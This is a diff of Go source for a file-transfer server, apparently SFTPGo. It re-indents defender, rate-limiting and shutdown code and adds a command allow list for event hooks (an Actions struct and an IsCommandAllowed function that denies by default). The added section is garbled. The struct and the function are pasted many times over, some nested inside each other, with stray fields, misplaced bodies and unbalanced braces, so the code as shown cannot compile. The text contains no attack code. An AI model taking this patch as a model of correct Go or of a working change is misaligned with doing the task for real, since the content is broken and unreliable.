defender Defender\n+                var err error\n+                switch c.DefenderConfig.Driver {\n+                case DefenderDriverProvider:\n+                        defender, err = newDBDefender(&c.DefenderConfig)\n+                default:\n+                        defender, err = newInMemoryDefender(&c.DefenderConfig)\n+                }\n+                if err != nil {\n+                        return fmt.Errorf(\"defender initialization error: %v\", err)\n+                }\n+                logger.Info(logSender, \"\", \"defender initialized with config %+v\", c.DefenderConfig)\n+                Config.defender = defender\n+        }\n+        if c.AllowListStatus > 0 {\n+                allowList, err := dataprovider.NewIPList(dataprovider.IPListTypeAllowList)\n+                if err != nil {\n+                        return fmt.Errorf(\"unable to initialize the allow list: %w\", err)\n+                }\n+                logger.Info(logSender, \"\", \"allow list initialized\")\n+                Config.allowList = allowList\n+        }\n+        if err := c.initializeProxyProtocol(); err != nil {\n+                return err\n+        }\n+        vfs.SetTempPath(c.TempPath)\n+        dataprovider.SetTempPath(c.TempPath)\n+        vfs.SetAllowSelfConnections(c.AllowSelfConnections)\n+        vfs.SetRenameMode(c.RenameMode)\n+        vfs.SetReadMetadataMode(c.Metadata.Read)\n+        vfs.SetResumeMaxSize(c.ResumeMaxSize)\n+        vfs.SetUploadMode(c.UploadMode)\n+        dataprovider.SetAllowSelfConnections(c.AllowSelfConnections)\n+        transfersChecker = getTransfersChecker(isShared)\n+        return nil\n }\n \n // CheckClosing returns an error if the service is closing\n func CheckClosing() error {\n-\tif isShuttingDown.Load() {\n-\t\treturn ErrShuttingDown\n-\t}\n-\treturn nil\n+        if isShuttingDown.Load() {\n+                return ErrShuttingDown\n+        }\n+        return nil\n }\n \n // WaitForTransfers waits, for the specified grace time, for currently ongoing\n // client-initiated transfer sessions to completes.\n // A zero graceTime means no wait\n func WaitForTransfers(graceTime int) {\n-\tif graceTime == 0 {\n-\t\treturn\n-\t}\n-\tif isShuttingDown.Swap(true) {\n-\t\treturn\n-\t}\n-\n-\tif activeHooks.Load() == 0 && getActiveConnections() == 0 {\n-\t\treturn\n-\t}\n-\n-\tgraceTimer := time.NewTimer(time.Duration(graceTime) * time.Second)\n-\tticker := time.NewTicker(3 * time.Second)\n-\n-\tfor {\n-\t\tselect {\n-\t\tcase <-ticker.C:\n-\t\t\thooks := activeHooks.Load()\n-\t\t\tlogger.Info(logSender, \"\", \"active hooks: %d\", hooks)\n-\t\t\tif hooks == 0 && getActiveConnections() == 0 {\n-\t\t\t\tlogger.Info(logSender, \"\", \"no more active connections, graceful shutdown\")\n-\t\t\t\tticker.Stop()\n-\t\t\t\tgraceTimer.Stop()\n-\t\t\t\treturn\n-\t\t\t}\n-\t\tcase <-graceTimer.C:\n-\t\t\tlogger.Info(logSender, \"\", \"grace time expired, hard shutdown\")\n-\t\t\tticker.Stop()\n-\t\t\treturn\n-\t\t}\n-\t}\n+        if graceTime == 0 {\n+                return\n+        }\n+        if isShuttingDown.Swap(true) {\n+                return\n+        }\n+\n+        if activeHooks.Load() == 0 && getActiveConnections() == 0 {\n+                return\n+        }\n+\n+        graceTimer := time.NewTimer(time.Duration(graceTime) * time.Second)\n+        ticker := time.NewTicker(3 * time.Second)\n+\n+        for {\n+                select {\n+                case <-ticker.C:\n+                        hooks := activeHooks.Load()\n+                        logger.Info(logSender, \"\", \"active hooks: %d\", hooks)\n+                        if hooks == 0 && getActiveConnections() == 0 {\n+                                logger.Info(logSender, \"\", \"no more active connections, graceful shutdown\")\n+                                ticker.Stop()\n+                                graceTimer.Stop()\n+                                return\n+                        }\n+                case <-graceTimer.C:\n+                        logger.Info(logSender, \"\", \"grace time expired, hard shutdown\")\n+                        ticker.Stop()\n+                        return\n+                }\n+        }\n }\n \n // getActiveConnections returns the number of connections with active transfers\n func getActiveConnections() int {\n-\tvar activeConns int\n+        var activeConns int\n \n-\tConnections.RLock()\n-\tfor _, c := range Connections.connections {\n-\t\tif len(c.GetTransfers()) > 0 {\n-\t\t\tactiveConns++\n-\t\t}\n-\t}\n-\tConnections.RUnlock()\n+        Connections.RLock()\n+        for _, c := range Connections.connections {\n+                if len(c.GetTransfers()) > 0 {\n+                        activeConns++\n+                }\n+        }\n+        Connections.RUnlock()\n \n-\tlogger.Info(logSender, \"\", \"number of connections with active transfers: %d\", activeConns)\n-\treturn activeConns\n+        logger.Info(logSender, \"\", \"number of connections with active transfers: %d\", activeConns)\n+        return activeConns\n }\n \n // LimitRate blocks until all the configured rate limiters\n@@ -317,668 +317,1134 @@ func getActiveConnections() int {\n // It returns an error if the time to wait exceeds the max\n // allowed delay\n func LimitRate(protocol, ip string) (time.Duration, error) {\n-\tif Config.rateLimitersList != nil {\n-\t\tisListed, _, err := Config.rateLimitersList.IsListed(ip, protocol)\n-\t\tif err == nil && isListed {\n-\t\t\treturn 0, nil\n-\t\t}\n-\t}\n-\tfor _, limiter := range rateLimiters[protocol] {\n-\t\tif delay, err := limiter.Wait(ip, protocol); err != nil {\n-\t\t\tlogger.Debug(logSender, \"\", \"protocol %s ip %s: %v\", protocol, ip, err)\n-\t\t\treturn delay, err\n-\t\t}\n-\t}\n-\treturn 0, nil\n+        if Config.rateLimitersList != nil {\n+                isListed, _, err := Config.rateLimitersList.IsListed(ip, protocol)\n+                if err == nil && isListed {\n+                        return 0, nil\n+                }\n+        }\n+        for _, limiter := range rateLimiters[protocol] {\n+                if delay, err := limiter.Wait(ip, protocol); err != nil {\n+                        logger.Debug(logSender, \"\", \"protocol %s ip %s: %v\", protocol, ip, err)\n+                        return delay, err\n+                }\n+        }\n+        return 0, nil\n }\n \n // Reload reloads the whitelist, the IP filter plugin and the defender's block and safe lists\n func Reload() error {\n-\tplugin.Handler.ReloadFilter()\n-\treturn nil\n+        plugin.Handler.ReloadFilter()\n+        return nil\n }\n \n // DelayLogin applies the configured login delay\n func DelayLogin(err error) {\n-\tif Config.defender != nil {\n-\t\tConfig.defender.DelayLogin(err)\n-\t}\n+        if Config.defender != nil {\n+                Config.defender.DelayLogin(err)\n+        }\n }\n \n // IsBanned returns true if the specified IP address is banned\n func IsBanned(ip, protocol string) bool {\n-\tif plugin.Handler.IsIPBanned(ip, protocol) {\n-\t\treturn true\n-\t}\n-\tif Config.defender == nil {\n-\t\treturn false\n-\t}\n+        if plugin.Handler.IsIPBanned(ip, protocol) {\n+                return true\n+        }\n+        if Config.defender == nil {\n+                return false\n+        }\n \n-\treturn Config.defender.IsBanned(ip, protocol)\n+        return Config.defender.IsBanned(ip, protocol)\n }\n \n // GetDefenderBanTime returns the ban time for the given IP\n // or nil if the IP is not banned or the defender is disabled\n func GetDefenderBanTime(ip string) (*time.Time, error) {\n-\tif Config.defender == nil {\n-\t\treturn nil, nil\n-\t}\n+        if Config.defender == nil {\n+                return nil, nil\n+        }\n \n-\treturn Config.defender.GetBanTime(ip)\n+        return Config.defender.GetBanTime(ip)\n }\n \n // GetDefenderHosts returns hosts that are banned or for which some violations have been detected\n func GetDefenderHosts() ([]dataprovider.DefenderEntry, error) {\n-\tif Config.defender == nil {\n-\t\treturn nil, nil\n-\t}\n+        if Config.defender == nil {\n+                return nil, nil\n+        }\n \n-\treturn Config.defender.GetHosts()\n+        return Config.defender.GetHosts()\n }\n \n // GetDefenderHost returns a defender host by ip, if any\n func GetDefenderHost(ip string) (dataprovider.DefenderEntry, error) {\n-\tif Config.defender == nil {\n-\t\treturn dataprovider.DefenderEntry{}, errors.New(\"defender is disabled\")\n-\t}\n+        if Config.defender == nil {\n+                return dataprovider.DefenderEntry{}, errors.New(\"defender is disabled\")\n+        }\n \n-\treturn Config.defender.GetHost(ip)\n+        return Config.defender.GetHost(ip)\n }\n \n // DeleteDefenderHost removes the specified IP address from the defender lists\n func DeleteDefenderHost(ip string) bool {\n-\tif Config.defender == nil {\n-\t\treturn false\n-\t}\n+        if Config.defender == nil {\n+                return false\n+        }\n \n-\treturn Config.defender.DeleteHost(ip)\n+        return Config.defender.DeleteHost(ip)\n }\n \n // GetDefenderScore returns the score for the given IP\n func GetDefenderScore(ip string) (int, error) {\n-\tif Config.defender == nil {\n-\t\treturn 0, nil\n-\t}\n+        if Config.defender == nil {\n+                return 0, nil\n+        }\n \n-\treturn Config.defender.GetScore(ip)\n+        return Config.defender.GetScore(ip)\n }\n \n // AddDefenderEvent adds the specified defender event for the given IP.\n // Returns true if the IP is in the defender's safe list.\n func AddDefenderEvent(ip, protocol string, event HostEvent) bool {\n-\tif Config.defender == nil {\n-\t\treturn false\n-\t}\n+        if Config.defender == nil {\n+                return false\n+        }\n \n-\treturn Config.defender.AddEvent(ip, protocol, event)\n+        return Config.defender.AddEvent(ip, protocol, event)\n }\n \n func reloadProviderConfigs() {\n-\tconfigs, err := dataprovider.GetConfigs()\n-\tif err != nil {\n-\t\tlogger.Error(logSender, \"\", \"unable to load config from provider: %v\", err)\n-\t\treturn\n-\t}\n-\tconfigs.SetNilsToEmpty()\n-\tif fnUpdateBranding != nil {\n-\t\tfnUpdateBranding(configs.Branding)\n-\t}\n-\tif err := configs.SMTP.TryDecrypt(); err != nil {\n-\t\tlogger.Error(logSender, \"\", \"unable to decrypt smtp config: %v\", err)\n-\t\treturn\n-\t}\n-\tsmtp.Activate(configs.SMTP)\n+        configs, err := dataprovider.GetConfigs()\n+        if err != nil {\n+                logger.Error(logSender, \"\", \"unable to load config from provider: %v\", err)\n+                return\n+        }\n+        configs.SetNilsToEmpty()\n+        if fnUpdateBranding != nil {\n+                fnUpdateBranding(configs.Branding)\n+        }\n+        if err := configs.SMTP.TryDecrypt(); err != nil {\n+                logger.Error(logSender, \"\", \"unable to decrypt smtp config: %v\", err)\n+                return\n+        }\n+        smtp.Activate(configs.SMTP)\n }\n \n func startPeriodicChecks(duration time.Duration, isShared int) {\n-\tstartEventScheduler()\n-\tspec := fmt.Sprintf(\"@every %s\", duration)\n-\t_, err := eventScheduler.AddFunc(spec, Connections.checkTransfers)\n-\tutil.PanicOnError(err)\n-\tlogger.Info(logSender, \"\", \"scheduled overquota transfers check, schedule %q\", spec)\n-\tif isShared == 1 {\n-\t\tlogger.Info(logSender, \"\", \"add reload configs task\")\n-\t\t_, err := eventScheduler.AddFunc(\"@every 10m\", reloadProviderConfigs)\n-\t\tutil.PanicOnError(err)\n-\t}\n-\tif Config.IdleTimeout > 0 {\n-\t\tratio := idleTimeoutCheckInterval / periodicTimeoutCheckInterval\n-\t\tspec = fmt.Sprintf(\"@every %s\", duration*ratio)\n-\t\t_, err = eventScheduler.AddFunc(spec, Connections.checkIdles)\n-\t\tutil.PanicOnError(err)\n-\t\tlogger.Info(logSender, \"\", \"scheduled idle connections check, schedule %q\", spec)\n-\t}\n+        startEventScheduler()\n+        spec := fmt.Sprintf(\"@every %s\", duration)\n+        _, err := eventScheduler.AddFunc(spec, Connections.checkTransfers)\n+        util.PanicOnError(err)\n+        logger.Info(logSender, \"\", \"scheduled overquota transfers check, schedule %q\", spec)\n+        if isShared == 1 {\n+                logger.Info(logSender, \"\", \"add reload configs task\")\n+                _, err := eventScheduler.AddFunc(\"@every 10m\", reloadProviderConfigs)\n+                util.PanicOnError(err)\n+        }\n+        if Config.IdleTimeout > 0 {\n+                ratio := idleTimeoutCheckInterval / periodicTimeoutCheckInterval\n+                spec = fmt.Sprintf(\"@every %s\", duration*ratio)\n+                _, err = eventScheduler.AddFunc(spec, Connections.checkIdles)\n+                util.PanicOnError(err)\n+                logger.Info(logSender, \"\", \"scheduled idle connections check, schedule %q\", spec)\n+        }\n }\n \n // ActiveTransfer defines the interface for the current active transfers\n type ActiveTransfer interface {\n-\tGetID() int64\n-\tGetType() int\n-\tGetSize() int64\n-\tGetDownloadedSize() int64\n-\tGetUploadedSize() int64\n-\tGetVirtualPath() string\n-\tGetStartTime() time.Time\n-\tSignalClose(err error)\n-\tTruncate(fsPath string, size int64) (int64, error)\n-\tGetRealFsPath(fsPath string) string\n-\tSetTimes(fsPath string, atime time.Time, mtime time.Time) bool\n-\tGetTruncatedSize() int64\n-\tHasSizeLimit() bool\n+        GetID() int64\n+        GetType() int\n+        GetSize() int64\n+        GetDownloadedSize() int64\n+        GetUploadedSize() int64\n+        GetVirtualPath() string\n+        GetStartTime() time.Time\n+        SignalClose(err error)\n+        Truncate(fsPath string, size int64) (int64, error)\n+        GetRealFsPath(fsPath string) string\n+        SetTimes(fsPath string, atime time.Time, mtime time.Time) bool\n+        GetTruncatedSize() int64\n+        HasSizeLimit() bool\n }\n \n // ActiveConnection defines the interface for the current active connections\n type ActiveConnection interface {\n-\tGetID() string\n-\tGetUsername() string\n-\tGetRole() string\n-\tGetMaxSessions() int\n-\tGetLocalAddress() string\n-\tGetRemoteAddress() string\n-\tGetClientVersion() string\n-\tGetProtocol() string\n-\tGetConnectionTime() time.Time\n-\tGetLastActivity() time.Time\n-\tGetCommand() string\n-\tDisconnect() error\n-\tAddTransfer(t ActiveTransfer)\n-\tRemoveTransfer(t ActiveTransfer)\n-\tGetTransfers() []ConnectionTransfer\n-\tSignalTransferClose(transferID int64, err error)\n-\tCloseFS() error\n-\tisAccessAllowed() bool\n+        GetID() string\n+        GetUsername() string\n+        GetRole() string\n+        GetMaxSessions() int\n+        GetLocalAddress() string\n+        GetRemoteAddress() string\n+        GetClientVersion() string\n+        GetProtocol() string\n+        GetConnectionTime() time.Time\n+        GetLastActivity() time.Time\n+        GetCommand() string\n+        Disconnect() error\n+        AddTransfer(t ActiveTransfer)\n+        RemoveTransfer(t ActiveTransfer)\n+        GetTransfers() []ConnectionTransfer\n+        SignalTransferClose(transferID int64, err error)\n+        CloseFS() error\n+        isAccessAllowed() bool\n }\n \n // StatAttributes defines the attributes for set stat commands\n type StatAttributes struct {\n-\tMode  os.FileMode\n-\tAtime time.Time\n-\tMtime time.Time\n-\tUID   int\n-\tGID   int\n-\tFlags int\n-\tSize  int64\n+        Mode  os.FileMode\n+        Atime time.Time\n+        Mtime time.Time\n+        UID   int\n+        GID   int\n+        Flags int\n+        Size  int64\n }\n \n // ConnectionTransfer defines the trasfer details\n type ConnectionTransfer struct {\n-\tID            int64  `json:\"-\"`\n-\tOperationType string `json:\"operation_type\"`\n-\tStartTime     int64  `json:\"start_time\"`\n-\tSize          int64  `json:\"size\"`\n-\tVirtualPath   string `json:\"path\"`\n-\tHasSizeLimit  bool   `json:\"-\"`\n-\tULSize        int64  `json:\"-\"`\n-\tDLSize        int64  `json:\"-\"`\n+        ID            int64  `json:\"-\"`\n+        OperationType string `json:\"operation_type\"`\n+        StartTime     int64  `json:\"start_time\"`\n+        Size          int64  `json:\"size\"`\n+        VirtualPath   string `json:\"path\"`\n+        HasSizeLimit  bool   `json:\"-\"`\n+        ULSize        int64  `json:\"-\"`\n+        DLSize        int64  `json:\"-\"`\n }\n \n // MetadataConfig defines how to handle metadata for cloud storage backends\n type MetadataConfig struct {\n-\t// If not zero the metadata will be read before downloads and will be\n-\t// available in notifications\n-\tRead int `json:\"read\" mapstructure:\"read\"`\n+        // If not zero the metadata will be read before downloads and will be\n+        // available in notifications\n+        Read int `json:\"read\" mapstructure:\"read\"`\n+}\n+\n+type Actions struct {\n+type Actions struct {\n+    Hook string `json:\"hook\" mapstructure:\"hook\"`\n+    ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+    ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+    AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+\n+// Actions defines actions that can be executed on different events\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// Actions defines actions that can be executed on different events\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+// Actions defines actions that can be executed on different events\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+\n+// Actions defines actions that can be executed on different events\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+// Actions defines actions that can be executed on different events\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+// Actions defines actions that can be executed on different events\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+// For security reasons we deny by default\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n }\n \n // Configuration defines configuration parameters common to all supported protocols\n+// Actions defines actions that can be executed on different events\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[\"*\"]` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+return false\n+}\n+\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+\n+return slices.Contains(allowed, cmd)\n+}\n+\n+\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+return false\n+}\n+\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+\n+return slices.Contains(allowed, cmd)\n+}\n+\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed 